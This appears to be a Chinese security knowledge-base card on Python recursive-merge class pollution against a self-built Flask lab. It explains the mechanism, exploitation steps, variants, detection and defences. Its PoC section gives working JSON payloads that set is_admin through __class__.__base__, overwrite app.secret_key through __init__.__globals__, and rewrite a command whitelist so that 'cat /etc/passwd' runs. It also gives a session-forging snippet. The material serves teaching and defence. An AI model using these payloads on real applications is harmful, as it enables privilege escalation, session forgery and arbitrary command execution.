---
id: web-python-recursive-merge-class-pollution-globals-rce
title: Python 递归合并类污染：__class__.__base__ 改类属性与 __init__.__globals__ 篡改全局（提权/SECRET_KEY/RCE）
type: scenario
domain: web
path: web/python
technique: python-recursive-merge-class-pollution-globals
aliases:
- Python Class Pollution
- Python 类污染
- 递归合并属性污染
- __class__.__base__ 提权
- __init__.__globals__ 污染
- hasattr setattr merge pollution
- Flask secret_key 覆盖
tags:
- python
- class-pollution
- attribute-pollution
- prototype-pollution
- dunder
- globals
- flask
- secret-key
- session-forgery
- command-whitelist
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:32:07+08:00'
  notes: 已对照原文与29张图核对：vulnerable_merge 的 hasattr/getattr/setattr 递归分支与原文一致；__class__.__base__ 将 BaseUser.is_admin 污染为 true，alice/bob/attacker 全部 is_admin=true（图11-15）；default_credit 100→999999（图16/17/26）；__class__.__init__.__globals__ 覆盖 app.secret_key 后 /debug 前缀变为 attacker_control...（图19/21），伪造 session 访问 /admin 返回 200 与 superadmin（图22/23）；篡改 ALLOWED_COMMANDS 后 cmd=whoami 执行 id、cmd=rce 读取 /etc/passwd（图24/25/27/28）。未验证点：目标为原文自建 Flask 靶场（flask 3.1.1 仅环境版本，未设 affected_versions），PoC 未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

当 Python Web 应用用递归合并函数（`hasattr` + `getattr` + `setattr`）把用户可控 JSON 写入对象、且不阻止双下划线属性时，攻击者可以从任意实例出发，经 `__class__`/`__base__` 改写类属性实现全局提权，或经 `__class__.__init__.__globals__` 进入模块全局命名空间，覆盖 Flask `secret_key` 伪造管理员会话，或篡改命令白名单字典，最终在另一个业务接口触发任意命令执行。

## 原理

- **Python 对象模型**：实例访问属性时按“实例 `__dict__` → 类 `__dict__` → MRO 父类”查找。类属性被修改后，所有没有同名实例属性的现有实例和未来实例都会读到新值；实例属性会遮蔽类属性。
- **递归合并失控**：典型脆弱写法对每个 key 判断 `hasattr(dst, key)`，为真且 value 是 dict 就 `getattr(dst, key)` 递归深入，否则 `setattr(dst, key, value)`。由于 Python 对象天然拥有 `__class__`、`__base__`、`__init__`、`__globals__` 等属性，`hasattr` 对 dunder key 返回 True，递归便沿继承链和函数对象深入：
  - `instance.__class__` 得到类对象；`class.__base__` 得到父类；在父类上 `setattr` 即污染整个继承体系共享的类属性。
  - `class.__init__` 得到函数对象；函数对象的 `__globals__` 是其定义模块的全局命名空间字典。合并函数在 dict 分支与对象属性分支之间无缝切换，进入 `__globals__` 后即可写入任意模块级变量。
- **为什么能提权**：`is_admin` 若只定义为类属性（`BaseUser.is_admin = False`），实例没有同名属性；把 `BaseUser.is_admin` 改为 `True` 后，所有用户实例（包括从未发请求的 alice 和新注册的 bob）都变为管理员。
- **为什么能伪造会话**：Flask 的 session 是不可篡改的签名 Cookie，HMAC 密钥来自 `app.secret_key`。`__globals__['app']` 暴露 Flask 应用对象，`setattr(app, 'secret_key', 已知值)` 后，攻击者可用 Flask 自身的 `SecureCookieSessionInterface` 按已知密钥签发任意 session（如 `{"username":"superadmin","is_admin":true}`），服务端验签通过。
- **为什么能 RCE**：命令执行点本身可以使用严格白名单（如 `ALLOWED_COMMANDS = {"whoami": "whoami", ...}`，`os.popen(ALLOWED_COMMANDS.get(cmd))`）。但该字典是模块级可变对象；通过 `__globals__` 把 `whoami` 映射改成 `id`、新增 `rce` 映射到任意命令后，再请求原本无害的 `/system/info?cmd=...` 即可执行任意命令。注入点（资料更新）与执行点（系统信息接口）分离，传统命令注入特征扫描难以发现。

## 触发条件

- 应用存在把用户可控嵌套 JSON 递归合并进对象的入口，合并逻辑使用 `hasattr`/`getattr`/`setattr`（或 `__dict__` 递归、字典与对象混合递归），且未阻止 `__` 开头/结尾的 key。
- JSON 能表达嵌套 dict，从而驱动递归；value 可以是布尔、数字、字符串或 dict。
- 目标对象是普通 Python 实例或类对象；Python 类与函数对象默认可写（未使用 `__slots__`、不可变内置类型等限制）。
- 提权链需要敏感的类属性（如 `is_admin`）未在 `__init__` 中写成实例属性。
- SECRET_KEY 链需要 Flask 应用对象位于 `__init__` 所在模块的全局命名空间，且 `app.secret_key` 可被赋值；目标使用 Flask 默认的签名 Cookie session。
- RCE 链需要另一个 sink 读取模块级可变配置/白名单来决定危险操作（命令、路径、模板、导入等）。

## 利用步骤

1. 找到递归合并入口，确认合并函数的分支逻辑与目标对象类型；用正常字段确认写入生效。
2. 探测对象结构：提交 `{"__class__": {}}` 观察是否递归进入类对象；确认实例所属类及父类。
3. 按目标选择利用链：
   - **类属性提权**：构造 `__class__.__base__.<attr>` 写入敏感类属性（如 `is_admin: true`），验证其他用户/新注册用户是否继承该值。
   - **全局变量劫持**：构造 `__class__.__init__.__globals__.<global>`，先读取/探测全局变量名（如 `app`、`ALLOWED_COMMANDS`、`os`、`sys`），再覆盖目标值。
   - **Flask 会话伪造**：覆盖 `app.secret_key` 后，用已知密钥和 Flask 的 `SecureCookieSessionInterface` 签发管理员 session，携带 Cookie 访问管理接口。
   - **白名单篡改 RCE**：覆盖命令白名单字典的映射或新增条目，再请求读取该白名单的执行接口。
4. 验证影响：检查其他用户权限、`/admin` 响应、命令输出等；确认修改是进程级、跨请求持久的。
5. 可进一步测试 `os.environ`（PATH 劫持）、`sys.path`（导入劫持）、WAF 黑名单、模板环境等全局对象，扩大影响。

## PoC

类属性提权：

```http
POST /profile/update HTTP/1.1
Content-Type: application/json

{"username":"attacker","update":{"__class__":{"__base__":{"is_admin":true}}}}
```

遍历路径：`attacker` 实例 → `__class__`（UserProfile 类）→ `__base__`（BaseUser 类）→ `setattr(BaseUser, "is_admin", true)`。

覆盖 Flask `secret_key`：

```http
POST /profile/update HTTP/1.1
Content-Type: application/json

{"username":"attacker","update":{"__class__":{"__init__":{"__globals__":{"app":{"secret_key":"attacker_controlled_key_2025"}}}}}}
```

伪造 session：

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "attacker_controlled_key_2025"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = serializer.dumps({"username": "superadmin", "is_admin": True})
# 携带 session=<cookie> 访问 /admin
```

篡改命令白名单实现 RCE：

```http
POST /profile/update HTTP/1.1
Content-Type: application/json

{"username":"attacker","update":{"__class__":{"__init__":{"__globals__":{"ALLOWED_COMMANDS":{"whoami":"id","rce":"cat /etc/passwd | head -5"}}}}}}
```

随后请求原本只允许白名单命令的接口：

```http
GET /system/info?cmd=rce HTTP/1.1
```

响应返回 `/etc/passwd` 内容，证明任意命令执行。

## 变体与关联

- 变体（合并实现）：`hasattr`+`setattr` 递归；直接操作 `dst.__dict__`；字典与对象混合递归。只要允许 dunder key 或任意属性名，均可到达类对象/模块全局。
- 变体（起点）：`__class__`、`__base__`、`__bases__`、`__mro__`、`__subclasses__()`、`__init__.__globals__`、函数对象 `__globals__`；拿到 `__globals__` 后可改 `os.environ`、`sys.path`、WAF 黑名单、Jinja 环境等。
- 变体（影响）：类属性提权/数值篡改；Flask `secret_key` 覆盖后伪造/解密 session、绕过 CSRF；全局白名单或配置篡改后由独立 sink 触发 RCE。
- 关联：[[web-python-pydash-set-attribute-path-pollution]]（同类 Python 属性污染，但入口是 `pydash.set_` 点分路径；本卡是递归合并用户 JSON，sink 与 payload 形态不同）。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]（同样经 `__globals__` 触达 Flask 全局，但由模板注入驱动）。
- 关联：[[web-nodejs-prototype-pollution-merge-json-parse]]（JavaScript 原型链污染的对应模式：递归合并 + 未过滤原型属性）。
- 边界：JSON 无法表示模块对象，通常只能写可 JSON 序列化的值；不可变类型/`__slots__` 对象可能拒绝 `setattr`；实例已有同名属性时类属性污染不影响该实例；不同进程/worker 之间内存不共享，污染只作用于当前进程。

## 检测与防御

- 根本修复：不要用通用递归合并处理用户输入。改为显式字段白名单映射（只允许业务字段），或使用 Pydantic 等模型校验并丢弃未声明字段。
- 若必须递归：拒绝所有 `__` 开头/结尾的 key，并拒绝非预期类型；黑名单只是兜底，仍可能遗漏单下划线私有属性或其它语言特性。
- 隔离敏感全局：不要依赖模块级可变字典做安全决策（命令白名单、权限开关）；使用不可变配置、类/模块常量或每次从受保护存储读取。
- Flask：`secret_key` 从环境/密钥管理服务加载，运行期校验其未被修改；发现泄露或可写路径时立即轮换；session 只存不可伪造的服务端状态或使用服务端 session。
- 最小权限：Web 进程以低权限用户运行，限制其可写目录与可执行文件搜索路径；对危险 sink（`os.popen`/`subprocess`）做二次白名单与参数校验。
- 检测：请求体中出现 `__class__`、`__base__`、`__bases__`、`__mro__`、`__subclasses__`、`__init__`、`__globals__`、`__dict__` 等 key；合并入口收到含点号/双下划线的字段名；运行期 `app.secret_key`、全局字典、`os.environ`、`sys.path` 被异常修改；同一进程内权限状态突然变化；`/admin` 出现异常会话；命令执行接口返回与白名单预期不符的输出（如 `uid=`、`root:`）。
